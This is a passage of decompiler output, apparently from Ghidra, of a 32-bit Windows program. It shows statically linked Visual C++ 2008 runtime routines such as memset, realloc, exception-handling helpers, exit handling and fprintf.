                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0041153c_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0041153c_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0041153c_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0041153c_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0xff < _Size)) && (DAT_0046ec40 != 0)) {
    pauVar2 = __VEC_memzero((undefined (*) [16])_Dst,_Val,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



// Library Function - Single Match
//  void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
                    // WARNING: Load size is inaccurate
  ExceptionList = *ExceptionList;
                    // WARNING: Could not recover jumptable at 0x004118f5. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)param_1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  void __stdcall _CallMemberFunction1(void *,void *,void *)
//  void __stdcall _CallMemberFunction2(void *,void *,void *,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x00411901. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
// 
// Library: Visual Studio 2008 Release

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  void *pvVar1;
  
  pvVar1 = ExceptionList;
  RtlUnwind(param_1,(PVOID)0x41192e,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *(void **)pvVar1 = ExceptionList;
  ExceptionList = pvVar1;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___CxxFrameHandler
//  ___CxxFrameHandler2
//  ___CxxFrameHandler3
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  _s_FuncInfo *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,'\0');
  return uVar1;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl CatchGuardHandler(struct EHExceptionRecord *,struct
// CatchGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
CatchGuardHandler(EHExceptionRecord *param_1,CatchGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  _Var1 = ___InternalCxxFrameHandler
                    ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,
                     (void *)0x0,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
                     (EHRegistrationNode *)param_2,'\0');
  return _Var1;
}



// Library Function - Single Match
//  int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
// *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x411a6b;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_0042b0a0 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)ExceptionList;
    ExceptionList = &local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 != 0) {
                    // WARNING: Load size is inaccurate
      *local_2c = *ExceptionList;
    }
    ExceptionList = local_2c;
  }
  return local_3c;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
// TranslatorGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  code *local_8;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0
             ,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),'\x01');
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    // WARNING: Could not recover jumptable at 0x00411b2e. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = (*local_8)();
  return _Var1;
}



// Library Function - Single Match
//  struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
// *,int,int,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2008 Release

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck(_s_FuncInfo *param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  TryBlockMapEntry *pTVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
  pTVar1 = param_1->pTryBlockMap;
  uVar5 = param_1->nTryBlocks;
  uVar2 = uVar5;
  uVar3 = uVar5;
  while (uVar4 = uVar2, -1 < param_2) {
    if (uVar5 == 0xffffffff) {
      _inconsistency();
    }
    uVar5 = uVar5 - 1;
    if (((pTVar1[uVar5].tryHigh < param_3) && (param_3 <= pTVar1[uVar5].catchHigh)) ||
       (uVar2 = uVar4, uVar5 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar5;
      uVar3 = uVar4;
    }
  }
  uVar5 = uVar5 + 1;
  *param_4 = uVar5;
  *param_5 = uVar3;
  if ((param_1->nTryBlocks < uVar3) || (uVar3 < uVar5)) {
    _inconsistency();
  }
  return pTVar1 + uVar5;
}



// Library Function - Single Match
//  __CreateFrameInfo
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



// Library Function - Single Match
//  __IsExceptionObjectToBeDestroyed
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



// Library Function - Single Match
//  __FindAndUnlinkFrame
// 
// Library: Visual Studio 2008 Release

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
  }
  else {
    p_Var2 = __getptd();
    pvVar1 = p_Var2->_pFrameInfoChain;
    do {
      pvVar3 = pvVar1;
      if (*(int *)((int)pvVar3 + 4) == 0) {
        _inconsistency();
        return;
      }
      pvVar1 = *(void **)((int)pvVar3 + 4);
    } while (param_1 != *(void **)((int)pvVar3 + 4));
    *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  }
  return;
}



// Library Function - Single Match
//  void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
// *,int,unsigned long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                ulong param_5)

{
  void *pvVar1;
  void *local_1c;
  code *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_0042b0a0 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = CatchGuardHandler;
  local_c = param_1;
  local_1c = ExceptionList;
  ExceptionList = &local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  ExceptionList = local_1c;
  return pvVar1;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_0042b0a0 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_0042b0a0 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// Library Function - Single Match
//  __purecall
// 
// Library: Visual Studio 2008 Release

void __purecall(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)__decode_pointer(DAT_0042daf8);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  __NMSG_WRITE(0x19);
  __set_abort_behavior(0,1);
                    // WARNING: Subroutine does not return
  _abort();
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  int iVar2;
  uint *puVar3;
  int *piVar4;
  DWORD DVar5;
  LPVOID pvVar6;
  uint *local_24;
  int *local_20;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
    return (void *)0x0;
  }
  if (DAT_0046ec44 == 3) {
    do {
      local_20 = (int *)0x0;
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_00411f1c;
      __lock(4);
      local_24 = (uint *)___sbh_find_block((int)_Memory);
      if (local_24 != (uint *)0x0) {
        if (_NewSize <= DAT_0046ec50) {
          iVar2 = ___sbh_resize_block(local_24,(int)_Memory,_NewSize);
          if (iVar2 == 0) {
            local_20 = ___sbh_alloc_block((uint *)_NewSize);
            if (local_20 != (int *)0x0) {
              puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
              if (_NewSize <= puVar3) {
                puVar3 = (uint *)_NewSize;
              }
              _memcpy(local_20,_Memory,(size_t)puVar3);
              local_24 = (uint *)___sbh_find_block((int)_Memory);
              ___sbh_free_block(local_24,(int)_Memory);
            }
          }
          else {
            local_20 = (int *)_Memory;
          }
        }
        if (local_20 == (int *)0x0) {
          if ((uint *)_NewSize == (uint *)0x0) {
            _NewSize = 1;
          }
          _NewSize = _NewSize + 0xf & 0xfffffff0;
          local_20 = (int *)HeapAlloc(DAT_0042d55c,0,_NewSize);
          if (local_20 != (int *)0x0) {
            puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
            if (_NewSize <= puVar3) {
              puVar3 = (uint *)_NewSize;
            }
            _memcpy(local_20,_Memory,(size_t)puVar3);
            ___sbh_free_block(local_24,(int)_Memory);
          }
        }
      }
      FUN_00411e87();
      if (local_24 == (uint *)0x0) {
        if ((uint *)_NewSize == (uint *)0x0) {
          _NewSize = 1;
        }
        _NewSize = _NewSize + 0xf & 0xfffffff0;
        local_20 = (int *)HeapReAlloc(DAT_0042d55c,0,_Memory,_NewSize);
      }
      if (local_20 != (int *)0x0) {
        return local_20;
      }
      if (DAT_0042d878 == 0) {
        piVar4 = __errno();
        if (local_24 != (uint *)0x0) {
          *piVar4 = 0xc;
          return (void *)0x0;
        }
        goto LAB_00411f49;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
    if (local_24 != (uint *)0x0) goto LAB_00411f28;
  }
  else {
    do {
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_00411f1c;
      if ((uint *)_NewSize == (uint *)0x0) {
        _NewSize = 1;
      }
      pvVar6 = HeapReAlloc(DAT_0042d55c,0,_Memory,_NewSize);
      if (pvVar6 != (LPVOID)0x0) {
        return pvVar6;
      }
      if (DAT_0042d878 == 0) {
        piVar4 = __errno();
LAB_00411f49:
        DVar5 = GetLastError();
        iVar2 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar2;
        return (void *)0x0;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
  }
  DVar5 = GetLastError();
  iVar2 = __get_errno_from_oserr(DVar5);
  *piVar4 = iVar2;
  return (void *)0x0;
LAB_00411f1c:
  __callnewh(_NewSize);
  piVar4 = __errno();
LAB_00411f28:
  *piVar4 = 0xc;
  return (void *)0x0;
}



void FUN_00411e87(void)

{
  FUN_00412cbf(4);
  return;
}



// Library Function - Single Match
//  __cfltcvt_init
// 
// Library: Visual Studio 2008 Release

void __cfltcvt_init(void)

{
  PTR_LAB_0042be34 = __cfltcvt;
  PTR_LAB_0042be38 = __cropzeros;
  PTR_LAB_0042be3c = __fassign;
  PTR_LAB_0042be40 = __forcdecpt;
  PTR_LAB_0042be44 = __positive;
  PTR_LAB_0042be48 = __cfltcvt;
  PTR_LAB_0042be4c = __cfltcvt_l;
  PTR_LAB_0042be50 = __fassign_l;
  PTR_LAB_0042be54 = __cropzeros_l;
  PTR_LAB_0042be58 = __forcdecpt_l;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __fpmath
// 
// Library: Visual Studio 2008 Release

void __cdecl __fpmath(int param_1)

{
  __cfltcvt_init();
  _DAT_0042d0a0 = __ms_p5_mp_test_fdiv();
  if (param_1 != 0) {
    __setdefaultprecision();
  }
  return;
}



// Library Function - Single Match
//  __crt_waiting_on_module_handle
// 
// Library: Visual Studio 2008 Release

void __cdecl __crt_waiting_on_module_handle(LPCWSTR param_1)

{
  HMODULE pHVar1;
  DWORD dwMilliseconds;
  
  dwMilliseconds = 1000;
  do {
    Sleep(dwMilliseconds);
    pHVar1 = GetModuleHandleW(param_1);
    dwMilliseconds = dwMilliseconds + 1000;
    if (60000 < dwMilliseconds) {
      return;
    }
  } while (pHVar1 == (HMODULE)0x0);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  pcVar1 = (code *)__decode_pointer((int)PTR___exit_0042b0b0);
  (*pcVar1)(0xff);
  return;
}



// Library Function - Single Match
//  ___crtCorExitProcess
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___crtCorExitProcess(int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(L"mscoree.dll");
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"CorExitProcess");
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2008 Release

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_0041207d(void)

{
  __lock(8);
  return;
}



void FUN_00412086(void)

{
  FUN_00412cbf(8);
  return;
}



// Library Function - Single Match
//  __initterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm(undefined **param_1)

{
  code **in_EAX;
  
  for (; in_EAX < param_1; in_EAX = in_EAX + 1) {
    if (*in_EAX != (code *)0x0) {
      (**in_EAX)();
    }
  }
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  
  BVar1 = __IsNonwritableInCurrentImage((PBYTE)&PTR___fpmath_00424e78);
  if (BVar1 != 0) {
    __fpmath(param_1);
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_004232a8,(undefined **)&DAT_004232c0);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_004179b6);
    __initterm((undefined **)&DAT_004232a4);
    if ((DAT_0046fc94 != (code *)0x0) &&
       (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0046fc94), BVar1 != 0)) {
      (*DAT_0046fc94)(0,2,0);
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x00412272)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2008 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *local_2c;
  int *local_24;
  int *local_20;
  
  __lock(8);
  if (DAT_0042d0d4 != 1) {
    _DAT_0042d0d0 = 1;
    DAT_0042d0cc = (undefined)param_3;
    if (param_2 == 0) {
      piVar1 = (int *)__decode_pointer(DAT_0046fc8c);
      if (piVar1 != (int *)0x0) {
        piVar2 = (int *)__decode_pointer(DAT_0046fc88);
        local_2c = piVar1;
        local_24 = piVar2;
        local_20 = piVar1;
        while (piVar2 = piVar2 + -1, piVar1 <= piVar2) {
          iVar3 = __encoded_null();
          if (*piVar2 != iVar3) {
            if (piVar2 < piVar1) break;
            pcVar4 = (code *)__decode_pointer(*piVar2);
            iVar3 = __encoded_null();
            *piVar2 = iVar3;
            (*pcVar4)();
            piVar5 = (int *)__decode_pointer(DAT_0046fc8c);
            piVar6 = (int *)__decode_pointer(DAT_0046fc88);
            if ((local_20 != piVar5) || (piVar1 = local_2c, local_24 != piVar6)) {
              piVar2 = piVar6;
              piVar1 = piVar5;
              local_2c = piVar5;
              local_24 = piVar6;
              local_20 = piVar5;
            }
          }
        }
      }
      __initterm((undefined **)&DAT_004232d0);
    }
    __initterm((undefined **)&DAT_004232d8);
  }
  FUN_0041226c();
  if (param_3 == 0) {
    DAT_0042d0d4 = 1;
    FUN_00412cbf(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_0041226c(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_00412cbf(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2008 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2008 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = __encoded_null();
  FUN_00413b2f(uVar1);
  FUN_0041994e(uVar1);
  FUN_00413f52(uVar1);
  FUN_00418a34(uVar1);
  FUN_0041993f(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_00408aec();
  __initp_eh_hooks();
  PTR___exit_0042b0b0 = (undefined *)__encode_pointer(0x412297);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fprintf
// 
// Library: Visual Studio 2008 Release

int __cdecl _fprintf(FILE *_File,char *_Format,...)

{
  int *piVar1;
  uint uVar2;
  int _Flag;
  undefined *puVar3;
  int local_20;
  
  local_20 = 0;
  if ((_File == (FILE *)0x0) || (_Format == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  __lock_file(_File);
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    uVar2 = __fileno(_File);
    if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
      puVar3 = &DAT_0042b798;
    }
    else {
      puVar3 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)uVar2 >> 5]);
    }
    if ((puVar3[0x24] & 0x7f) == 0) {
      if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
        puVar3 = &DAT_0042b798;
      }
      else {
        puVar3 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)uVar2 >> 5]);
      }
      if ((puVar3[0x24] & 0x80) == 0) goto LAB_004123ee;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    local_20 = -1;
  }
LAB_004123ee:
  if (local_20 == 0) {
    _Flag = __stbuf(_File);
    local_20 = __output_l(_File,_Format,(_locale_t)0x0,&stack0x0000000c);
    __ftbuf(_Flag,_File);
  }
  FUN_0041242b();
  return local_20;
}



void FUN_0041242b(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



undefined ** FUN_00412435(void)

{
  return &PTR_DAT_0042b0b8;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_0042b0b8) || ((FILE *)&DAT_0042b318 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)&_File[-0x21586]._base >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)0x42b0b7 < _File) && (_File < (FILE *)0x42b319)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_00412cbf(((int)&_File[-0x21586]._base >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2008 Release

